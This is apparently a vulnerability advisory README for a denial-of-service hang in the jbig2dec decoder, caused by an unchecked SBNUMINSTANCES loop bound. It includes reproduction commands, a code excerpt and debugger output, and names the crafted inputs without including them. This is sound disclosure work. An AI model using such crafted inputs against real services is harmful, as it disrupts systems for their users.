# jbig2dec text-region SBNUMINSTANCES CPU denial of service

This package contains a reproducer and advisory notes for a long-running
decode hang in jbig2dec.

## Summary

Two crafted JBIG2 inputs cause the normal `jbig2dec` command-line decoder to
run for an excessive amount of time. The root cause is an unchecked text-region
`SBNUMINSTANCES` field. In the primary reproducer, segment 4 sets
`SBNUMINSTANCES` to `0xffffffff`, causing `jbig2_decode_text_region()` to loop
toward 4,294,967,295 symbol instances on a tiny input.

This is not only a fuzzer-harness timeout. The real CLI path was verified to
time out with the same inputs.

## Affected Build

- Project: jbig2dec
- Repository: `git://git.ghostscript.com/jbig2dec.git`
- Tested commit: `71f2b02f821a4664d0777fcf8845f56614cedc89`
- Version reported by built CLI: `jbig2dec 0.20`

## Contents

- `PoC/Dockerfile`: reproducible OSS-Fuzz-style build environment
- `PoC/jbig2_fuzzer.cc`: original OSS-Fuzz fuzzer wrapper
- `PoC/timeout-913f58bc349328d7`: primary long-running input
- `PoC/timeout-9ca16597ba597ba8`: second long-running input
- `PoC/timeout-c4f782501f1eabe3`: control input that completed locally
- `jbig2dec_text_region_sbn_instances_dos.md`: cleaned vulnerability report
- `evidence/`: original generated reports and metadata

## Reproduce

Build:

```sh
cd PoC
docker build -t jbig2dec-timeout-poc .
```

Fuzzer timeout:

```sh
docker run --rm jbig2dec-timeout-poc \
  bash -c 'timeout 300 /out/jbig2_fuzzer /tmp/timeout-913f58bc349328d7; echo "exit=$?"'
```

Expected result: `exit=124`.

Real CLI timeout:

```sh
docker run --rm jbig2dec-timeout-poc \
  bash -c 'timeout --preserve-status 30 /src/jbig2dec/jbig2dec -q -o /tmp/out.pbm /tmp/timeout-913f58bc349328d7; echo "exit=$?"'
```

Expected result: timeout termination, observed locally as `exit=143`.

## Root Cause

The text-region parser reads `SBNUMINSTANCES` directly from attacker-controlled
input in `jbig2_text.c` and later uses it as the loop bound:

```c
params.SBNUMINSTANCES = jbig2_get_uint32(segment_data + offset);
...
while (NINSTANCES < params->SBNUMINSTANCES) {
```

For the primary reproducer, GDB showed:

```text
segment->number = 4
params.SBNUMINSTANCES = 4294967295
params.SBHUFF = 0
params.SBREFINE = 2
n_dicts = 0
text-region data size = 17 bytes
```

After a short run under GDB:

```text
NINSTANCES = 8351257
target = 4294967295
```

See `jbig2dec_text_region_sbn_instances_dos.md` for details.
